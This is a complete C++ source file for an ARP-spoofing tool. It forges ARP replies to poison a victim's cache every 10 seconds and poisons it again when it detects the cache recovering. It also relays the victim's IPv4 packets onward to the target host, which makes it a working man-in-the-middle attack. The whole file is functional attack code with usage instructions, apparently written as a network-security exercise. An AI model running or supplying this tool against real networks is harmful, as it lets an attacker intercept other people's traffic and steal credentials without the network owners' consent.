#include <cstdio>
#include <chrono>
#include <thread>
#include <vector>

#include <pcap.h>
#include <unistd.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "flow.h"

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

std::map<Ip, Mac> arp_table;
Flow flows[MAX_FLOWS];
int flow_count = 0;

void usage() {
    printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
    printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

// Retrieve MAC address of given interface
Mac get_mac(char *interface) {
    int fd;
    struct ifreq ifr;

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) {
        fprintf(stderr, "Error: couldn't retrieve MAC address - socket() failed\n");
        exit(EXIT_FAILURE);
    }

    strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);
    ifr.ifr_name[IFNAMSIZ - 1] = '\x00';
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
        close(fd);
        fprintf(stderr, "Error: couldn't retrieve MAC address - ioctl() failed\n");
        exit(EXIT_FAILURE);
    }

    close(fd);

    return Mac((uint8_t*)ifr.ifr_hwaddr.sa_data);
}

// Retrieve IP address of given interface
Ip get_ip(char *interface) {
    int fd;
    struct ifreq ifr;

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) {
        fprintf(stderr, "Error: couldn't retrieve IP address - socket() failed\n");
        exit(EXIT_FAILURE);
    }

    strncpy(ifr.ifr_name, interface, IFNAMSIZ - 1);
    ifr.ifr_name[IFNAMSIZ - 1] = '\x00';
    if (ioctl(fd, SIOCGIFADDR, &ifr) < 0) {
        close(fd);
        fprintf(stderr, "Error: couldn't retrieve IP address - ioctl() failed\n");
        exit(EXIT_FAILURE);
    }

    struct sockaddr_in* ip = (struct sockaddr_in*)&ifr.ifr_addr;
    close(fd);

    return Ip(ntohl(ip->sin_addr.s_addr));
}

// Send normal ARP request packet
void send_arp_req(pcap_t *pcap, Mac src_mac, Ip src_ip, Ip dst_ip) {
    EthArpPacket packet;

    packet.eth_.dmac_ = Mac::broadcastMac();
    packet.eth_.smac_ = src_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_ = htons(ArpHdr::Request);

    packet.arp_.smac_ = src_mac;
    packet.arp_.sip_ = htonl(src_ip);
    packet.arp_.tmac_ = Mac::nullMac();
    packet.arp_.tip_ = htonl(dst_ip);

    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "Error: pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
    }
}

// Receive normal ARP reply and return MAC address
Mac recv_arp_rep(pcap_t *pcap, Ip src_ip, Ip dst_ip, std::chrono::milliseconds::rep timeout = 2000) {
    auto start = std::chrono::steady_clock::now();
    struct pcap_pkthdr *header;
    const u_char *packet;

    while (true) {
        auto now = std::chrono::steady_clock::now();
        auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(now - start);
        if (elapsed.count() > timeout) break;

        int res = pcap_next_ex(pcap, &header, &packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("Error: pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
            break;
        }

        const EthArpPacket* arp_packet = reinterpret_cast<const EthArpPacket*>(packet);
        if (ntohs(arp_packet->eth_.type_) != EthHdr::Arp) continue;
        if (ntohs(arp_packet->arp_.op_) != ArpHdr::Reply) continue;
        if (ntohl(arp_packet->arp_.sip_) != src_ip) continue;
        if (ntohl(arp_packet->arp_.tip_) != dst_ip) continue;
        return Mac(arp_packet->arp_.smac_);
    }

    fprintf(stderr, "Error: Failed to receive ARP reply from %s\n", std::string(src_ip).data());
    return Mac::nullMac();
}

// Resolve MAC address for requested IP address using arp table
Mac resolve_mac(pcap_t *pcap, Mac my_mac, Ip my_ip, Ip req_ip){
    Mac res_mac;

    auto iter = arp_table.find(req_ip);
    if (iter != arp_table.end()){
        res_mac = iter->second;
    } else {
        send_arp_req(pcap, my_mac, my_ip, req_ip);
        res_mac = recv_arp_rep(pcap, req_ip, my_ip);

        if (res_mac == Mac::nullMac()) {
            fprintf(stderr, "Error: Failed to resolve MAC address for IP %s\n", std::string(req_ip).data());
            exit(EXIT_FAILURE);
        }

        arp_table[req_ip] = res_mac;
        printf("[-] ARP table updated (IP : %s, Mac : %s)\n", std::string(req_ip).data(), std::string(res_mac).data());
    }

    return res_mac;
}

// Initialize ARP spoofing flows
void setup_flows(pcap_t *pcap, Mac my_mac, Ip my_ip, int count, char *args[]){
    for (int i = 0; i < count; i+=2) {
        Ip sender_ip = Ip(args[i]);
        Ip target_ip = Ip(args[i+1]);
        Mac sender_mac = resolve_mac(pcap, my_mac, my_ip, sender_ip);
        Mac target_mac = resolve_mac(pcap, my_mac, my_ip, target_ip);

        if (sender_mac == Mac::nullMac() || target_mac == Mac::nullMac()) continue;
        if (flow_count >= MAX_FLOWS) {
            fprintf(stderr, "Error: Flow overflow.\n");
            return;
        }

        flows[flow_count].s_mac = sender_mac;
        flows[flow_count].s_ip = sender_ip;
        flows[flow_count].t_mac = target_mac;
        flows[flow_count].t_ip = target_ip;
        flow_count++;
    }
}

// Send ARP reply packet to poison sender's ARP cache
void arp_spoof(pcap_t *pcap, Mac src_mac, Ip target_ip, Mac sender_mac, Ip sender_ip) {
    EthArpPacket packet;

    packet.eth_.dmac_ = sender_mac;
    packet.eth_.smac_ = src_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_ = htons(ArpHdr::Reply);

    packet.arp_.smac_ = src_mac;
    packet.arp_.sip_ = htonl(target_ip);
    packet.arp_.tmac_ = sender_mac;
    packet.arp_.tip_ = htonl(sender_ip);

    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "Error: pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
    }

    printf("[-] ARP spoofed for flow %s -> %s\n",std::string(sender_ip).data(), std::string(target_ip).data());
}

// Send ARP packet periodically
void handle_spoofing_flows(char *dev, Flow flow, Mac my_mac){
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (pcap == nullptr) {
        fprintf(stderr, "Error: couldn't open device %s(%s)\n", dev, errbuf);
        exit(EXIT_FAILURE);
    }

    std::chrono::steady_clock::time_point last_spoof = {};
    struct pcap_pkthdr *header;
    const u_char *packet;

    while(true){
        // Send ARP spoofing packet for every 10s
        auto now = std::chrono::steady_clock::now();
        auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - last_spoof);
        if (elapsed > std::chrono::seconds(10)) {
            arp_spoof(pcap, my_mac, flow.t_ip, flow.s_mac, flow.s_ip);
            last_spoof = now;
        }

        int res = pcap_next_ex(pcap, &header, &packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("Error: pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
            break;
        }

        const EthHdr *eth_hdr = reinterpret_cast<const EthHdr*>(packet);

        // Handle ARP packet : Received ARP packet may trigger ARP recovery (either Broadcast or Unicast)
        if (ntohs(eth_hdr->type_) == EthHdr::Arp) {
            if (eth_hdr->smac_ == flow.s_mac && eth_hdr->dmac_ == my_mac) {
                printf("[!] ARP recover detected for flow %s -> %s (Unicast from sender)\n", std::string(flow.s_ip).data(), std::string(flow.t_ip).data());
            }
            else if (eth_hdr->dmac_ == Mac::broadcastMac() && eth_hdr->smac_ == flow.s_mac) {
                printf("[!] ARP recover detected for flow %s -> %s (Broadcast from sender)\n", std::string(flow.s_ip).data(), std::string(flow.t_ip).data());
            }
            else if (eth_hdr->dmac_ == Mac::broadcastMac() && eth_hdr->smac_ == flow.t_mac) {
                printf("[!] ARP recover detected for flow %s -> %s (Broadcast from target)\n", std::string(flow.s_ip).data(), std::string(flow.t_ip).data());
            }
            else {
                continue;
            }
            arp_spoof(pcap, my_mac, flow.t_ip, flow.s_mac, flow.s_ip);
            last_spoof = now;
        }

        // Handle IP packet : Relay IP packets from sender to target
        else if (ntohs(eth_hdr->type_) == EthHdr::Ip4) {
            if (eth_hdr->smac_ == flow.s_mac && eth_hdr->dmac_ == my_mac){
                std::vector<u_char> relay_packet(header->caplen);
                memcpy(relay_packet.data(), packet, header->caplen);

                EthHdr *eth_hdr_relay = reinterpret_cast<EthHdr*>(relay_packet.data());
                eth_hdr_relay->smac_ = my_mac;
                eth_hdr_relay->dmac_ = flow.t_mac;

                int res = pcap_sendpacket(pcap, relay_packet.data(), header->caplen);
                if (res != 0) {
                    fprintf(stderr, "Error: pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
                }
            }
        }
    }
    pcap_close(pcap);
}

void start_spoof_thread (char *dev, Mac my_mac){
    std::vector<std::thread> threads;

    for (int i = 0; i< flow_count; i++){
        threads.push_back(std::thread(handle_spoofing_flows, dev, flows[i], my_mac));
    }

    for (auto& t : threads){
        t.join();
    }
}

int main(int argc, char *argv[]) {
    if (argc < 4 || argc & 1) {
        usage();
        return EXIT_FAILURE;
    }

    char *dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);

    if (pcap == nullptr) {
        fprintf(stderr, "Error: couldn't open device %s(%s)\n", dev, errbuf);
        return EXIT_FAILURE;
    }

    Mac my_mac = get_mac(dev);
    printf("[*] my MAC addr: %s\n", std::string(my_mac).data());
    Ip  my_ip = get_ip(dev);
    printf("[*] my IP addr: %s\n", std::string(my_ip).data());

    // Add flows for each (sender, target) pairs
    setup_flows(pcap, my_mac, my_ip, argc - 2, argv + 2);
    // Start ARP spoofing threads for each flow
    start_spoof_thread(dev, my_mac);

    pcap_close(pcap);
}
